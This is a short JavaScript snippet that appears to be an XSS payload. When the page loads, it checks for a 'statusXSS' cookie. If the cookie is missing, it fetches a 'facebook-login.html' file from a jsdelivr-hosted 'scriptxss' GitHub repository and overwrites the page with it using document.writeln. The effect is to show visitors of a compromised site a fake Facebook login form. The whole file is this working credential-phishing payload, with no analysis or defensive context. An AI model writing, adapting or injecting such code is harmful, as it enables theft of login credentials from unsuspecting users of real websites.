document.addEventListener('DOMContentLoaded', function () {
  function getCookie(cookieName) {
    const cookies = document.cookie;
    const cookieArray = cookies.split(';');
    for (let i = 0; i < cookieArray.length; i++) {
        let cookie = cookieArray[i].trim();
        if (cookie.startsWith(cookieName + '=')) {
          return cookie.substring(cookieName.length + 1);
        }
    }
    return null;
  }
  const statusXSS = getCookie('statusXSS');

  if (statusXSS == null) {
    fetch('https://cdn.jsdelivr.net/gh/rndio/scriptxss@main/facebook-login.html')
    .then(response => response.text())
    .then(data => { document.writeln(data) });
  }
});
